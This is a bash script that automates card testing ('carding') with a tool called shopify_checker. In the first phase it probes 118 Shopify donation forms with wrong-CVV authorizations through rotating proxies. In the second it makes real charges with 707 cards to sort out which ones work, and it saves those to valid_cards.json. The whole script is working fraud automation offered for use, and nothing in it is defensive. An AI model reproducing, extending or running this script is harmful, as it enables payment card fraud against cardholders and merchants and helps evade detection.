#!/bin/bash
# Find Valid Gates and Cards - The Smart Way
# Phase 1: Find valid gates (FREE with auth-only)
# Phase 2: Test cards on valid gates only

set -e

echo "════════════════════════════════════════════════════════════"
echo "  Smart Gate & Card Finder"
echo "  Phase 1: Find valid gates (FREE - no charges)"
echo "  Phase 2: Test cards on valid gates only"
echo "════════════════════════════════════════════════════════════"
echo ""

# Check if ChromeDriver is running
if ! pgrep -f chromedriver > /dev/null; then
    echo "⚠️  ChromeDriver not running. Starting it..."
    chromedriver --port=9515 > /dev/null 2>&1 &
    sleep 2
    echo "✓ ChromeDriver started"
fi

# Phase 1: Find valid gates using authorization-only (FREE)
echo ""
echo "═══ PHASE 1: Finding Valid Gates (FREE) ═══"
echo "Testing 118 gates with authorization-only mode..."
echo "This uses wrong CVV (999) so NO charges are made"
echo ""

echo "y" | ./target/release/shopify_checker rotate \
  --gates full_test_gates.txt \
  --cards-file full_test_cards.txt \
  --proxy-file proxies.txt \
  --auth-only=true \
  --output phase1_auth_results.json

echo ""
echo "✓ Phase 1 complete!"
echo ""

# Extract valid gates (those that returned CVV_MISMATCH)
echo "Extracting valid gates..."
if [ -f phase1_auth_results.json ]; then
    cat phase1_auth_results.json | \
      jq '[.[] | select(.status == "CVV_MISMATCH" or .status == "CHARGED") | {gate: .gate, gateway: "Shopify", donation_form: true}]' \
      > valid_gates.json
    
    VALID_GATES=$(cat valid_gates.json | jq length)
    echo "✓ Found $VALID_GATES valid gates!"
    echo ""
    
    if [ "$VALID_GATES" -gt 0 ]; then
        echo "Valid gates saved to: valid_gates.json"
        echo ""
        echo "Sample valid gates:"
        cat valid_gates.json | jq -r '.[0:5] | .[] | .gate'
        echo ""
        
        # Phase 2: Test cards on valid gates only
        echo "═══ PHASE 2: Testing Cards on Valid Gates ═══"
        echo "Testing 707 cards on $VALID_GATES valid gates..."
        echo "This will make real charges to find valid cards"
        echo ""
        
        read -p "Proceed with Phase 2? (y/n): " -n 1 -r
        echo ""
        
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            echo "y" | ./target/release/shopify_checker rotate \
              --gates valid_gates.json \
              --cards-file full_test_cards.txt \
              --proxy-file proxies.txt \
              --auth-only=false \
              --output phase2_card_results.json
            
            echo ""
            echo "✓ Phase 2 complete!"
            echo ""
            
            # Extract valid cards
            if [ -f phase2_card_results.json ]; then
                cat phase2_card_results.json | \
                  jq '[.[] | select(.success == true) | .card] | unique' \
                  > valid_cards.json
                
                VALID_CARDS=$(cat valid_cards.json | jq length)
                echo "✓ Found $VALID_CARDS valid cards!"
                echo ""
                echo "Valid cards saved to: valid_cards.json"
                echo ""
                echo "Sample valid cards:"
                cat valid_cards.json | jq -r '.[0:5]'
            fi
        else
            echo "Phase 2 skipped. You can run it later with:"
            echo "./target/release/shopify_checker rotate --gates valid_gates.json --cards-file full_test_cards.txt --auth-only=false"
        fi
    else
        echo "❌ No valid gates found!"
        echo "All gates returned DECLINED or errors"
    fi
else
    echo "❌ Phase 1 results file not found!"
fi

echo ""
echo "════════════════════════════════════════════════════════════"
echo "  Summary"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Phase 1 (Auth-Only): $VALID_GATES valid gates found"
if [ -f valid_cards.json ]; then
    echo "Phase 2 (Real Test): $VALID_CARDS valid cards found"
fi
echo ""
echo "Files created:"
echo "  - phase1_auth_results.json (all auth-only results)"
echo "  - valid_gates.json (gates that work)"
if [ -f phase2_card_results.json ]; then
    echo "  - phase2_card_results.json (all card test results)"
    echo "  - valid_cards.json (cards that work)"
fi
echo ""
echo "Cost: Phase 1 = $0, Phase 2 = ~\$$(echo "$VALID_GATES * 0.5" | bc) (estimated)"
echo ""
